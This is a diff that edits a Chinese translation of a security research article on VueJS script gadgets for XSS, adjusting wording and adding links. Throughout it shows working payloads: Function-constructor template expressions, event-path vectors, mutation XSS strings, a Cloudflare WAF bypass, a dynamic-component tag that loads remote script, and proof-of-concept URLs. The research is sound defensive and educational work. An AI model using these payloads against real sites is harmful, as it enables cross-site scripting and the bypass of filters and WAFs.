@@ -1,13 +1,13 @@
 ---
 layout: post
-title: 使用VueJS脚本gadgets规避防御
+title: 使用VueJS脚本小工具规避防御
 ---
 
 ## 介紹
 
-我们发现，流行的JavaScript框架VueJS提供了对网站安全有严重影响的功能。如果您遇到使用Vue的Web应用程序，本篇文章将帮助您理解由gadgets脚本创建的Vue特定XSS向量，您可以使用这些gadgets脚本来利用目标。
+我们发现，流行的JavaScript框架VueJS提供了对网站安全有严重影响的功能。如果您遇到使用Vue的Web应用程序，本篇文章将帮助您理解由脚本小工具创建的Vue特定XSS向量，您可以使用这些脚本小工具来利用目标。
 
-gadgets脚本是一些由框架创建的额外功能，可以导致JavaScript执行。这些功能可以是JavaScript或基于HTML的。gadgets脚本通常对绕过WAF和CSP等防御措施很有用。从开发者的角度来看，了解一个框架或库创建的所有gadgets脚本也是很有用的；当允许用户在自己的Web应用程序中输入时，这些知识可以帮助防止XSS漏洞。在本篇文章中，我们将涵盖从基于表达式的向量到突变XSS（mXSS）等多种技术。
+脚本小工具是一些由框架创建的额外功能，可以导致JavaScript执行。这些功能可以是JavaScript或基于HTML的。gadgets脚本通常对绕过WAF和CSP等防御措施很有用。从开发者的角度来看，了解一个框架或库创建的所有脚本小工具也是很有用的；当允许用户在自己的Web应用程序中输入时，这些知识可以帮助防止XSS漏洞。在本篇文章中，我们将涵盖从基于表达式的向量到突变XSS（mXSS）等多种技术。
 
 ### 注意
 
@@ -42,7 +42,7 @@ gadgets脚本是一些由框架创建的额外功能，可以导致JavaScript执
 return new Function(code)
 ```
 
-我们在这一行添加了一个断点，并刷新了页面。然后我们检查了代码变量的内容，果然，我们可以看到我们的向量。代码在一个with语句中，后面是一个return语句。因此，执行代码的范围是在with语句中指定的对象内。基本上，这意味着没有全局的alert()函数，但在with范围内，有VueJS函数，如_c、_v和_s。
+我们在这一行添加了一个断点，并刷新了页面。然后我们检查了代码变量的内容，果然，我们可以看到我们的向量。代码在一个with语句中，后面是一个return语句。因此，执行代码的范围是在with语句中指定的对象内。基本上，这意味着没有全局的alert()函数，但在with作用域内，有VueJS函数，如_c、_v和_s。
 
 如果我们使用这些函数，我们就可以减少表达式的大小。这个函数的构造函数将是Function构造函数，它允许我们执行代码。这意味着我们可以将向量减少到。
 ```
@@ -99,12 +99,12 @@ return new Function(code)
 <p :=_c.constructor`alert(1)`()> (32 bytes)
 ```
 
-但短的还是模板向量。
+但更短的还是模板向量。
 ```
 { {_c.constructor('alert(1)')()} }  (32 bytes)
 { {_b.constructor`alert(1)`()} }    (30 bytes)
 ```
-在尝试了无数种方法来编写高尔夫代码，只是为了能让它在30个字节以内，我们最终在Vue API中遇到了动态组件。
+在尝试了无数种方法来编写高尔夫代码，只是为了能让它在30个字节以内，我们最终在[Vue API](https://vuejs.org/v2/api/#is)中遇到了[动态组件](https://vuejs.org/v2/guide/components.html#Dynamic-Components)。
 
 动态组件本质上是可以在稍后的时间点改变为不同的组件。这是通过使用标签上的is属性实现的。考虑下面的例子。
 ```
@@ -119,13 +119,14 @@ return new Function(code)
 现在只有23个字节了！这是我们在整个研究过程中能想到的VueJS v2最短的向量。这是我们在整个研究过程中能想到的VueJS v2最短的向量。
 
 ### 事件
+
 就像AngularJS一样，VueJS定义了一个名为$event的特殊对象，它引用了浏览器中的事件对象。使用这个$event对象，你可以访问浏览器窗口对象，允许你调用任何你喜欢的东西。
 ```
 <img src @error="e=$event.path;e[e.length-1].alert(1)">
 <img src @error="e=$event.path.pop().alert(1)">
 ```
 
-我们确定@error会对一个表达式进行评估，因为VueJS提供了速记语法，这使得你可以用@代替使用v-on指令为错误或点击等事件的处理程序打前缀。文档中还透露，你可以使用$event变量来访问原始DOM事件。
+我们确定@error会执行表达式，由于VueJS提供了[速记语法](https://vuejs.org/v2/guide/syntax.html#v-on-Shorthand)，这使得你可以用@代替使用v-on指令为错误或点击等事件的处理程序打前缀。文档中还透露，你可以[使用$event变量](https://vuejs.org/v2/guide/events.html#Methods-in-Inline-Handlers)来访问原始DOM事件。
 
 这些向量的工作得益于Chrome在事件执行时定义的一个特殊路径属性。这个属性包含一个触发事件的对象数组。对我们来说至关重要的是，窗口对象总是这个数组中的最后一个元素。composedPath()函数会在其他浏览器中生成一个类似的数组，这使得我们可以构建一个跨浏览器向量，如下所示。
 ```
@@ -152,7 +153,7 @@ return new Function(code)
 ### 沉默的水槽
 默认情况下，当AngularJS（版本1）和VueJS等框架渲染页面时，它们不会执行超前（AoT）完成。这个怪癖意味着，如果你能够在使用该框架的模板内注入，你可能会偷偷插入自己的任意有效载荷，并将其执行。
 
-当一个应用程序已经部分重构为使用新的框架，但仍然包含依赖于额外第三方库的遗留代码时，这有时会导致问题。一个很好的例子是VueJS和JQuery。JQuery库暴露了各种方法，比如text()。就其本身而言，这对XSS是相对安全的，因为它的输出是HTML编码的。然而，当你将其与一个使用Mustache风格的模板语法（如{ { } }）的框架结合起来时，再加上一个只执行文本操作的方法，如$('#message').text(userInput)，这可能会导致一个 "沉默 "的水槽。这是一个有趣的攻击向量，因为你在一般被认为是安全的方法中引入了一个新的漏洞。例如，在这个fiddle中，注意到只有第二个有效载荷被执行。
+当一个应用程序已经部分重构为使用新的框架，但仍然包含依赖于额外第三方库的遗留代码时，这有时会导致问题。一个很好的例子是VueJS和JQuery。JQuery库暴露了各种方法，比如[text()](https://api.jquery.com/text/)。就其本身而言，这对XSS是相对安全的，因为它的输出是HTML编码的。然而，当你将其与一个使用Mustache风格的模板语法（如{ { } }）的框架结合起来时，再加上一个只执行文本操作的方法，如$('#message').text(userInput)，这可能会导致一个 "沉默 "的水槽。这是一个有趣的攻击向量，因为你在一般被认为是安全的方法中引入了一个新的漏洞。例如，在这个[fiddle](https://jsfiddle.net/4r02y3qa/)中，注意到只有第二个payload被执行。
 ```
 
 $('#message').text("'><script>alert(1)<\/script>'");
@@ -160,6 +161,7 @@ $('#message1').text("{ {_c.constructor('alert(2)')()} }")
 ```
 
 ## 突变XSS
+
 然后，我们开始研究突变XSS（[mXSS](https://portswigger.net/research/mxss)）向量，以及如何使用VueJS来引起它们。传统上，mXSS向量需要在DOM中进行修改才能突变，反射输入通常不会突变，因为DOM在被注入后没有被修改。然而，在VueJS的情况下，表达式和HTML会被解析并随后被修改，这意味着DOM的修改确实会发生。因此，被HTML过滤器过滤的反射输入会变成mXSS!
 
 我们发现的第一个突变是由VueJS解析属性的方式引起的。如果你在属性名中使用引号，VueJS就会感到困惑，解码属性值，然后删除无效的属性名。这将导致mXSS，[并渲染iframe](https://portswigger-labs.net/xss/vuejs2.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=alert(1)%26gt;%22%3E)。
@@ -177,7 +179,7 @@ $('#message1').text("{ {_c.constructor('alert(2)')()} }")
 <a href="https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(top.name)%26gt;%22%3E" target=alert(1337)>test</a>
 ```
 
-我们使用htmlentities欺骗Cloudflare WAF允许onload事件，然后使用setTimeout()，将窗口名称传递给它并执行，然后。后来，我们发现，你可以简化bypass如下。
+我们使用htmlentities欺骗Cloudflare WAF允许onload事件，然后使用setTimeout()，将窗口名称传递给它并执行，然后。后来，我们发现，你可以[简化bypass](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(/alert(1)/.source)%26gt;%22%3E)如下。
 ```
 <x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> 
 ```
@@ -234,7 +236,7 @@ document.body.innerHTML+=''
 ```
 document.body.innerHTML+=''
 ```
-我们最终发现，这些突变也可以通过< noframes>、< noembed>和< iframe>元素实现。这很有趣，但我们真正需要的是一种通过VueJS来实现突变的方法，而不需要任何手动的DOM操作。在我们寻找突变的过程中，我们意识到VueJS会使HTML发生突变。我们想出了一个简单的测试来证明这一点。通常情况下，如果你把一个标签放在另一个标签中，只有第一个标签会被渲染，因为没有为第二个标签找到收尾>。另一方面，VueJS实际上会为你突变并删除第一个标签。
+我们最终发现，这些突变也可以通过< noframes>、< noembed>和< iframe>元素实现。这很有趣，但我们真正需要的是一种通过VueJS来实现突变的方法，而不需要任何手动的DOM操作。在我们寻找突变的过程中，我们意识到VueJS会使HTML发生突变。我们想出了一个简单的测试来证明这一点。通常情况下，如果你把一个标签放在另一个标签中，只有第一个标签会被渲染，因为没有为第二个标签找到收尾>。另一方面，VueJS实际上会[为你突变并删除第一个标签](https://portswigger-labs.net/xss/vuejs2.php?x=%3Cxyz%3Cimg/src%20onerror=alert(1)%3E%3E)。
 
 输入：
 ```
@@ -353,7 +355,7 @@ return function render(_ctx, _cache) {
   }
 }
 ```
-然而，有一个特殊的<component>标签，它与是[手拉手](https://github.com/vuejs/vue-next/blob/24041b7ac1a22ca6c10bf2af81c9250af26bda34/packages/compiler-core/src/transforms/transformElement.ts#L342)用来创建动态组件。所以我们需要做的就是将x改为component。
+然而，有一个特殊的<component>标签，[与之并用](https://github.com/vuejs/vue-next/blob/24041b7ac1a22ca6c10bf2af81c9250af26bda34/packages/compiler-core/src/transforms/transformElement.ts#L342)的是创建动态组件。 所以我们要做的就是将x更改为component.
 ```
 <component is=script src=//14.rs>
 ```
@@ -404,7 +406,7 @@ return function render(_ctx, _cache) {
 ```
 [POC](https://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=script:nth-child(2)%3Ealert%26lpar;1%26rpar;%3C/teleport%3E%3C/div%3E%3Cscript%3E%3C/script%3E)
 
-在这个例子中，当前的样式是蓝色的，但我们注入一个<teleport>标签来改变内联样式表的样式。文本就会变成红色。
+在这个例子中，当前的样式是蓝色的，但我们注入一个< teleport>标签来改变内联样式表的样式。文本就会变成红色。
 ```
  <teleport to="style">
     /* Can be Entity Encoded */
@@ -429,9 +431,9 @@ return function render(_ctx, _cache) {
 
 ### 反向传送
 
-我们还发现了一些东西，我们决定称之为 "反向传送"。我们已经讨论过VueJS有一个<teleport>标签，但如果你在模板表达式中包含一个CSS选择器，你可以将任何其他HTML元素作为目标，并将该元素的内容作为表达式执行。即使目标标签在应用程序边界之外，这也是有效的! 
+我们还发现了一些东西，我们决定称之为 "反向传送"。我们已经讨论过VueJS有一个< teleport>标签，但如果你在模板表达式中包含一个CSS选择器，你可以将任何其他HTML元素作为目标，并将该元素的内容作为表达式执行。即使目标标签在应用程序边界之外，这也是有效的! 
 
-当我们意识到VueJS会在表达式的整个内容上运行[querySelector](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)时，我们都相当震惊，[只要它以#开头](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)。下面的片段演示了一个带有CSS查询的表达式，其目标是类为haha的<div>。第二个表达式即使在应用程序边界之外也会被执行。
+当我们意识到VueJS会在表达式的整个内容上运行[querySelector](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)时，我们都相当震惊，[只要它以#开头](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)。下面的片段演示了一个带有CSS查询的表达式，其目标是类为haha的< div>。第二个表达式即使在应用程序边界之外也会被执行。
 ```
 <div id="app">#x,.haha</div><div class=haha>{ {_Vue.h.constructor`alert(1)`()} }</div>
 <!-- Notice the div above is outside the application div -->
@@ -458,7 +460,7 @@ app.mount('#app')
 
 ### 过滤器
 
-诸如DOMPurify这样的过滤器，有一套非常好的标签和属性的白名单，以帮助阻止任何被认为不正常的东西。然而，由于它们都允许模板语法，因此在与VueJS等前端框架结合使用时，它们并不能提供强大的XSS攻击保护。
+诸如[DOMPurify](https://github.com/cure53/DOMPurify)这样的过滤器，有一套非常好的标签和属性的白名单，以帮助阻止任何被认为不正常的东西。然而，由于它们都允许模板语法，因此在与VueJS等前端框架结合使用时，它们并不能提供强大的XSS攻击保护。
 
 ### CSP
 
